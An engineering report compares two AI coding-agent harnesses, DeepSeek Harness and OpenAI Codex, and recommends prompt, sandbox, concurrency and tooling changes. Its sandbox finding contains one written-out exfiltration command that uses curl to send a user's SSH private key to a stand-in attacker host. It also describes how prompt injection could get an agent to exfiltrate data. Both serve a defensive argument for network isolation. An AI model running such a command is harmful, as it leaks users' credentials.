# Uplifting DSH: what to change and what to change it with

A deep, evidence-based comparison of **DeepSeek Harness** against **OpenAI Codex**, with concrete
recommendations split by *where the change belongs*: a plugin bundle a deployment can mount today,
or the harness core.

> **Where this goes next:** see [FORK-OR-PLUGIN.md](FORK-OR-PLUGIN.md) for the decision on forking
> versus extending, the verified reachability of each recommendation, and how to give the work back
> upstream. [../patches/UPSTREAM-REPORTS.md](../patches/UPSTREAM-REPORTS.md) holds the five reports
> ready to file.

- **DSH** `639ed015397290b3745d163aafe02ffee4aa3f84`, tag `dsh-v0.2.0-rc.2`. TypeScript/pnpm monorepo, 316 packages across 61 groups
- **Codex** `2abb02bc004fe2847d1f99f47610c92d1744b22d`. Rust, 100 crates

Supporting evidence is in [`raw/`](raw/). Nine reports, ~6,300 lines, every claim carrying a
`file:line` cite and marked `VERIFIED` or `INFERRED`. Two of those reports correct findings I had
recorded from my own measurements; both corrections are preserved, not quietly dropped.

---

## The short version

DSH is a **better-engineered harness than its reputation suggests**, and several things I expected
to be weaknesses are not. Where it loses, it loses in specific, fixable places.

**DSH is ahead on:** edit safety (unique anchors, stale-read CAS, atomic fsync'd writes, fail-closed
ambiguity), the read side (`read`/`glob`/`grep` with pagination, which Codex lacks entirely),
error handling and reconnection in MCP, configuration composition, jobs control, subagent interop,
session retrieval, and a stricter test culture.

**DSH is behind on:** behavioural prompt coverage, tool-schema context economy, network isolation,
tool discovery, and a handful of smaller seams.

**Four of the five biggest wins need no change to the harness at all.** The plugin/patch model
already reaches them. That is the main finding, and it is why the recommendations below are
organised by route, not by severity.

---

## The five findings that matter

### 1. DSH has no behavioural policy layer; Codex has 4x more prompt, and it is the load-bearing part

Measured from a live session: DSH's assembled system prompt is **7,001 characters (~1,750 tokens)**,
and almost all of it is per-tool one-liners. The harness identity is one sentence
(`packages/core/system-prompt/src/index.ts:429`); the desktop persona is two
(`packages/bundle/web-app/cordis.patch.yml:19-21`).

Codex's assembled base is roughly **30,500 characters (~7,600 tokens)** of hand-written policy.
The live text is server-delivered via `models-manager/models.json` → `model_messages.instructions_template`
(the `.md` files in `codex-rs/core/` are *not* compiled in, a correction to my first reading), and
it covers planning discipline with contrasting good/bad examples, "keep going until the query is
completely resolved", verification philosophy, ambition-vs-precision, progress preambles, a final-answer
formatting contract, editing constraints, git safety, review mindset, and frontend anti-slop.

**The gap is coverage, not quality.** Where DSH does write prompt guidance it is excellent. The
plan-mode policy in `packages/bundle/base/cordis.patch.yml:325-334` is arguably better than Codex's,
and closes the "conversational agreement is not approval" trap that Codex leaves open. The problem is
that it renders *only in plan mode*. `todo_write` registers **no prompt section at all**
(`grep -c systemPrompt packages/todo/tool-todo/src/index.ts` → 0), so an ordinary session says
nothing about when to plan.

**Route: plugin.** → [`packages/dsh-guidance-pack`](../packages/dsh-guidance-pack), built and tested.

### 2. Tool schemas cost 8.5x the system prompt, and 63% of that is MCP

From the live `request/header` record:

| | tools | bytes | ~tokens |
|---|---|---|---|
| MCP (`mcp__sage__*`) | 35 | 37,302 | ~9,326 |
| Native DSH | 30 | 22,229 | ~5,557 |
| **Every request** | **65** | **59,531** | **~14,883** |

Codex models exposure explicitly. `ToolExposure::{Deferred, DeferredModelOnly, CodeModeOnly, Hidden}`
(`codex-rs/core/src/tools/registry.rs:410-413`), a BM25 `tool_search`, and `ToolSpec::Namespace`.
DSH has the *primitive* (`deferLoading`, `packages/llm/llm/src/types.ts:479`; emitted at
`llm-deepseek/src/serialize.ts:164`) but **no shipped tool sets it**, only mid-session additions do.

DSH hides tools but cannot advertise them. This is the largest context-economy gap and it is
structural.

**Route: core (large).** Partial mitigation is plugin-able. A workspace plugin could stop mounting
unused MCP servers, which is where 63% of the cost sits. → *not built; see Tier 3.*

### 3. DSH's sandbox has no network dimension: a read-only session can exfiltrate

This is the highest-severity finding in either harness, and I checked it myself instead of
taking a dive's word for it.

`SandboxMode` is file-effects-only, and its own type says so:

> File-effect policy for confined processes. `read-only` permits only required sinks such as
> `/dev/null`; `workspace-write` also permits the workspace and a backend-defined temp area;
> `danger-full-access` bypasses confinement. **Network and process visibility are outside this
> vocabulary.**
> — `packages/sandbox/sandbox/src/index.ts:24-30`

The macOS Seatbelt profile is four clauses, and the first is permissive
(`packages/sandbox/sandbox-local/src/profiles.ts:52`):

```
(version 1) (allow default) (deny file-write*) (allow file-write* (literal "/dev/null"))
```

`(allow default)` permits everything not explicitly denied, so the deny covers writes and nothing
else. Linux bwrap never passes `--unshare-net`
(`grep -rniE "unshare-net|network_access|deny network" packages/sandbox/ native/system/` → **zero
hits**). Landlock grants are file-only.

So a `read-only` session on macOS or Linux can `curl -d @$HOME/.ssh/id_rsa https://attacker.example`
and succeed. Prompt-injection exfiltration has no harness obstacle. DSH's own RFCs admit this
(`.agents/notes/implemented/feature/2026-07-06-sandbox.md:196`) and name the deferred fix.

Codex closes it four ways: default `network_access: false`; deny-by-default Seatbelt opening only
loopback proxy ports; `--unshare-net` plus a seccomp filter EPERMing `connect`/`socket`/`sendto`;
and Windows firewall rules scoped to a provisioned sandbox user.

**Route: core.** Not plugin-able, a plugin cannot add a syscall fence. Note the honest mitigation
available today: DSH's *approval* layer is unaffected, so `ask` mode still gates the command; it is
the `never`/auto path and any sandboxed-but-unapproved call that is exposed. A `tools/pre-execute`
guard that recognises network-capable commands is a speed bump, not a fence, and should be labelled
as such if shipped.

### 4. DSH's auto-review is Codex's guardian, shipped off

Codex's `guardian` crate decides `on-request` approvals automatically: rebuild a compact transcript,
ask a dedicated review session for strict JSON, fail closed, apply allow/deny
(`codex-rs/core/src/guardian/mod.rs:1-20`).

DSH has the same thing at `packages/experimental/auto-review`. Per-call effect classification,
fail-closed denials, malformed-response failure, PTC inner-call coverage. **No bundle mounts it**:
its `cordis.patch.yml` is a bare self-insert and no bundle references it. Its README says so:
*"The dsh installation ships this layer switched off."*

I verified it *is* present in the installed app by reading `app.asar`'s header, so a profile can
resolve it by name.

**Route: configuration.** → [`patches/enable-auto-review.md`](../patches/enable-auto-review.md).

### 5. Shell, edit, and MCP tool calls are serialized

I initially measured DSH as parallelising correctly. **That was wrong**, and the code-reading dive
caught it. Breaking the same transcript down by tool name:

```
step n tools span(ms) sumIndividual(ms) overlap
1:11 4 subagent 61 227 YES
1:4 2 bash 28829 28828 no
1:9 2 bash 3896 3896 no
1:18 2 read,bash 216 216 no
```

Every batch containing `bash` has span == sum, strictly serial. Only `subagent` fan-out overlaps.

The mechanism is per-tool opt-in: `isConcurrencySafe(args)` must return exactly `true`, and it fails
closed (`packages/core/tools/src/index.ts:1303-1313`). Opted in: `read`, `read-image`, web
search/fetch, the three session-query tools, `subagent`. **Exclusive:** `bash`, persistent bash,
pwsh, `write`, `edit`, **all MCP tools**, `run_code`.

Codex marks `exec_command` and `write_stdin` parallel-safe and gates on one `RwLock` per sampling
request, so the latency-dominant case overlaps there and not here.

**Measured cost in my session: 1,005 ms of 35,962 ms (3%)**, small only because my commands were
fast. 16 of 30 steps issued multi-call bash batches. A batch of long independent commands pays the
full sum here and only the maximum in Codex.

**Route: core, but small.** A one-line `isConcurrencySafe` classifier on the shell `defineTool`
sites, argument-aware for read-only commands, plus an MCP `readOnlyHint` mapping.

---

## What DSH already does better: do not "fix" these

Worth stating plainly, because a comparison framed as "be more like Codex" would destroy real
advantages.

| Area | DSH | Codex |
|---|---|---|
| Duplicate anchor | Refuses with line numbers | First match wins, silently (`tool.rs:193-198`) |
| Stale read | Prior-read gate + version CAS before matching | Pre-flight check discarded, apply re-derives (`lib.rs:609-616`) |
| Write durability | temp + fsync + rename | `set_len(0)` + `write_all`, no fsync (`no_follow/unix.rs:135-141`) |
| `Add File` on existing | Refused | Silent overwrite (`tool.rs:348-364`) |
| Multi-file failure | n/a | Earlier files stay changed (scenario `015`) |
| File read tools | `read`/`glob`/`grep`, paginated, 3 truncation footers | **None**: reads via shell, output cut at 1 MiB |
| MCP errors/reconnect | Atomic tool-set swap with rollback, bounded reconnect budget, typed refusals | Weaker |
| Jobs control | `job_output`/`list`/`kill`, push-on-complete, 6 PTY tools, 5 signals | `write_stdin` poll only; no list, no kill |
| Sandbox honesty | `full\|partial` on every wrap; hard refuse when unavailable | Silent `SandboxType::None` |
| Config composition | Patches restructure the whole boot graph, hot-reloaded | Layers merge values into a fixed schema |
| Subagent interop | 6 drivers incl. real Codex and Claude Code children | Single provider |
| Tests | Per-file 100% coverage as the gate; 415 recorded sessions replayed through the real binary; fault-injection LLM server; 6 benchmark groups as a required PR gate | Broader but no coverage gate, no real-API e2e lane |

Two things follow. First, **`apply_patch` is worth adding to DSH, but not by porting Codex's
version**. The plugin built here takes Codex's multi-file expressiveness and keeps DSH's
guarantees. Second, the recurring theme is that DSH optimises for *guaranteeing* a change and Codex
optimises for *expressing* one; the useful move is to add expression without giving up guarantee.

---

## Tier 1: plugin route, buildable today

### 1.1 Guidance pack: **built and tested**

`packages/dsh-guidance-pack`. One prompt section, 11 blocks, **7,036 characters (~1,759 tokens)**,
taking the default DSH prompt from ~1,750 to ~3,080 tokens. That is still under half of Codex's
~7,600.

Covers: finishing the task, planning, editing constraints, verification, destructive actions,
asking-vs-acting, efficiency, scope, reporting, review, frontend.

**What it deliberately omits** is enforced by a test: no restatement of DSH's tool-selection rules,
file-link grammar, read-before-edit, sandbox/approval policy (injected live every turn), or
deliverable presentation. Importing Codex's link format would actively conflict with DSH's.

19 tests, all passing.

### 1.2 Enable auto-review: **documented, one config change**

`patches/enable-auto-review.md`. Two routes: the Web GUI's Plugins page (safest. The harness owns
the write), or adding `@deepseek-ai/dsh-experimental-auto-review` to the profile's `dependencies`
and `dsh.profile.bundles`. Verified resolvable from the installed app.

### 1.3 apply_patch tool: **built and tested**

`packages/dsh-apply-patch`. 49 tests, all passing. Multi-file, multi-hunk, all-or-nothing.

Deliberately keeps: four-rung tolerance ladder (Codex), uniqueness refusal + cursor disambiguation
(DSH), refuse-to-overwrite on create (DSH), plan-everything-then-write (better than Codex),
`ctx.fs` integration so the sandbox fence, observation policy, version CAS, and atomic write all
apply.

**Two operations are refused, not faked**: `*** Delete File` and `*** Move to:`. The harness
`fs` service exposes no remove operation, so a "move" would write the destination and leave the
source, a silent copy where a rename was asked for. That is exactly the failure class this tool
exists to avoid, so it refuses and names the bash alternative. Closing it properly is a small core
change: add `removeText` to the `fs` seam.

### Smaller plugin-shaped wins

| Change | Why | Effort |
|---|---|---|
| Scope-guard the three unconditional prompt sections (`tool:jobs`, `tool:goal`, `tool:ralph`) | They render even for restricted agents that cannot see the tool | L |
| Close the parameter root (`additionalProperties: false`) by default | DSH silently accepts unknown arguments today; a misspelled `file_path` is a no-op (`core/tools/src/schema.ts:444-457`) | M |
| AGENTS.md scope/precedence spec in the instruction wrapper | DSH never explains scope and never says re-reading is unnecessary, despite nested discovery-on-touch making redundant reads likely | L |
| Always-on `todo_write` discipline | Already covered by the guidance pack's `planning` block | L |
| Post-compaction continuity note | Compaction drops the todo list with no read-back tool | L |
| Parallel-read / shell-hygiene guidance | Covered by the guidance pack's `efficiency` block | L |

---

## Tier 2: core changes, small and high-use

| # | Change | Impact | Effort | Where |
|---|---|---|---|---|
| 2.1 | Argument-aware `isConcurrencySafe` on shell tools; MCP `readOnlyHint` mapping | **H** | L | `shell/tool-bash/src/index.ts:374`, `tool-bash-persistent:414`, pwsh ×2, `mcp/mcp-client` bridge |
| 2.2 | Fix the compaction pressure budget for small/medium windows | M | L | `compaction/compaction-basic/src/config.ts:75-76,181-194` |
| 2.3 | Input-reduction fallback so compaction can compact its own input | **H** | M | `compaction-basic/src/region.ts` `summarizeCompaction` |
| 2.4 | Harness-driven same-turn escalation retry | **H** | M | `shell/tool-bash/src/index.ts`, `sandbox/src/escalation.ts` |
| 2.5 | Approval memory (session + command-prefix grants) | **H** | M | `interaction/user-approval/src/{types,index}.ts` |
| 2.6 | Re-inject durable task state after compaction | M | M | `todo/tool-todo/src/index.ts` |
| 2.7 | Derive the pruner budget from the routed model, not a fixed 8192 chars | M | L | `compaction/compaction-tool-result-pruner/src/{config,index}.ts` |
| 2.8 | `removeText` on the `fs` seam | M | M | `fs/fs/src/index.ts`: unblocks apply_patch delete and rename |
| 2.9 | Enforce the declared `timeoutMs` in core dispatch | M | M | `core/tools/src/index.ts:1356-1369` |
| 2.10 | Per-turn loop guard + real `stop_hook_active` | M | L | `hooks/hooks-codex/src/index.ts:263-272`, `core/agent-loop/src/index.ts:334-346` |

**2.2 is a real bug that this deployment does not hit, check before "fixing" it.** The pressure
budget is `(contextWindow - reservedCompletion) - headroomTokens`, and it **throws** when that goes
negative, which the listener downgrades to a one-time warning. So on a window below roughly
`headroomTokens + reservedCompletion` there is no proactive compaction at all. With the shipped
`headroomTokens: 65536` that means any window under ~73.5k is unprotected.

But `deepseek-flash` ships `contextWindow: 1_000_000`
(`packages/llm/llm-deepseek/src/defaults.ts:6`), where the threshold is
`min(1_000_000 × 0.8, (1_000_000 − R) − 65536)`. The ratio binds for any `R` below ~134k, so the
threshold is **800,000 tokens, a correct 80% of the window**. Lowering `headroomTokens` here
changes nothing. This matters only for a deployment that runs a smaller-window model or overrides
`contextWindow`, which is why it drops to M: worth reporting upstream, not worth acting on locally.

The same arithmetic corrects an earlier claim of mine. I described a 128k window compacting at
42.6%; that is true, and it is a consequence of the absolute 65,536-token headroom dominating the
ratio on smaller windows, not of the ratio itself being wrong. For a deployment that wants the 0.8
ratio to bind, the fix is config, not code:

```yaml
- id: compaction-basic
 name: "@deepseek-ai/dsh-compaction-basic"
 config:
 headroomTokens: 16384
```

Verify the actual numbers before applying it, the arithmetic is
`min(contextWindow × 0.8, contextWindow − reservedCompletion − headroomTokens)`, and on this
deployment it already resolves to the correct 80%.

---

## Tier 3: core changes, larger

| # | Change | Impact | Effort |
|---|---|---|---|
| 3.1 | **Network dimension in the sandbox vocabulary**, enforced per backend | **H** | **H** |
| 3.2 | Model-facing `tool_search` + deferred exposure for MCP tools | **H** | **H** |
| 3.3 | Stream-time tool dispatch (start a tool while the message is still streaming) | **H** | **H** |
| 3.4 | Bounded command policy language | M | H |
| 3.5 | Model-invocable compaction (`new_context` equivalent) | M | M |
| 3.6 | LSP: stop discarding diagnostics; wire them into `tools/post-execute` | **H** | H |
| 3.7 | Ship a default language-server table and mount `tool-lsp` | **H** | L |
| 3.8 | Cache MCP tool catalogs across reconnects — **built** and filed as [discussion 8720](https://github.com/deepseek-ai/deepseek-harness/discussions/8720), [`patches/mcp-catalog-reuse.patch`](../patches/mcp-catalog-reuse.patch) | L–M | S |
| 3.9 | MCP OAuth / bearer / dynamic headers | M | M |
| 3.10 | Worktree-per-subagent provider | M | M |

**3.1 is the one to do first.** It is the only finding in this report where DSH is not merely behind
but *unsafe in a way a user would not expect from a mode called "read-only"*. Everything else is
quality or cost.

**3.6/3.7 are a matched pair.** DSH's LSP client is real but reaches nothing: four read-only
operations, the notification channel carrying `publishDiagnostics` is discarded
(`lsp-stdio/src/connection.ts:248`, with the comment *"ignored by this MVP host"*), and `tool-lsp` is
mounted by **no shipped preset**, so default language coverage is effectively zero. The substrate
for a post-edit diagnostics loop already exists at `tools/post-execute`; only the semantics are missing
(the README names them: "freshness and accumulation rules").

**3.8 is built, and smaller than its raw report proposed.** R5 called for a new `catalog-cache.ts`
LRU; the pinned SDK already ships one, so the change is to share one response store across transport
generations and ask for a cached list on a reconnect instead of writing a second cache. What
measurement added is the protocol detail that decides the outcome: on the 2026-07-28 revision a
server declares cacheability with `ttlMs`, the server framework emits `ttlMs: 0` ("immediately
stale") when the server declares nothing, and an explicit declaration beats any client default. So
the reuse is server-declared wherever the server speaks, with a bounded client fallback only where
it is silent. Notably, this item is *not* on the critical path for the 63 %-of-tool-bytes finding —
those bytes are sent either way; see [`../patches/FINDING-mcp-catalog-reuse.md`](../patches/FINDING-mcp-catalog-reuse.md).

---

## What not to do

- **Do not port Codex's prompts verbatim.** They are tuned to GPT-5 checkpoint behaviour and are far
 too large for DSH's cache-stable design. Adopt clauses, not the document.
- **Do not move DSH's dynamic context into the system prompt.** Injecting sandbox mode and approval
 policy as a volatile superseding snapshot is better factoring than Codex's approach, and DSH's
 cache-prefix discipline (tool catalog held constant across mode transitions) is better than
 anything Codex does.
- **Do not replace DSH's tool-owned prompt sections with one central prompt.** The fragmentation
 costs less than the coupling a central prompt would add. The guidance pack fills the *cross-cutting*
 gap without touching the per-tool sections.
- **Do not adopt Codex's `untrusted` approval mode** until a command policy language exists, it is
 pure friction without prefix rules.
- **Do not add a partial-downgrade escape hatch to the sandbox.** DSH's hard refusal when no backend
 is available is better than Codex's silent `SandboxType::None`.
- **Do not "fix" the serialization by making `write`/`edit` fully parallel** without path-scoped
 claims. Two edits to one file in one batch would race; the correct shape is a concurrency key.

---

## How to verify any of this

Every recommendation above carries a `file:line` cite in [`raw/`](raw/). Two techniques are worth
keeping, because both cost me time:

**Reading a DSH session transcript.** The file is a *concatenated multi-frame* zstd stream. 145
frames in the session measured here. Node's `zstdDecompressSync` silently returns only the first
frame, so the whole file decompresses to a 229-byte header and looks like an empty session.
`tools/session-audit.mjs` exports the answer: `scanFrames(buffer)` walks the frame and block
structure the way the harness's own `scanZstdFrames` does, and `framesOf(path)` returns each frame's
span and text. **Do not split on the `28 B5 2F FD` magic instead** — this paragraph recommended that
until 2026-10-03, when the same shortcut inflated a frame during a log repair: the magic occurs
inside compressed payloads by chance, a decode from there succeeds and yields plausible text, and
the frame count still comes out right, so the corruption is invisible. Structure is the only thing
that distinguishes a frame boundary from four bytes of payload. The `/usr/local/bin/zstd` on this
machine is an x86 binary and fails with `Bad CPU type in executable`.

**Measuring tool concurrency.** Pair `tool/call` → `tool/result` by `callId` and compare per-step
wall span against the sum of individual durations. Aggregate over steps, and **break down by tool
name**. Aggregating first is exactly how I concluded "DSH parallelises" from two `subagent` batches
while every `bash` batch was serial.

## Built artifacts

| Path | Tests | Status |
|---|---|---|
| [`packages/dsh-guidance-pack`](../packages/dsh-guidance-pack) | 19 passing | Ready to mount |
| [`packages/dsh-apply-patch`](../packages/dsh-apply-patch) | 49 passing | Ready to mount; delete/rename blocked on `fs.removeText` |
| [`patches/enable-auto-review.md`](../patches/enable-auto-review.md) | n/a | One-line profile change, verified resolvable |

Both plugins are unit-tested without a harness boot. Their integration layers (`src/index.ts`) import
harness packages not installed in this workspace, so they are exercised by mounting the bundle into a
profile, not by `npm test`. Stated plainly, not implied.
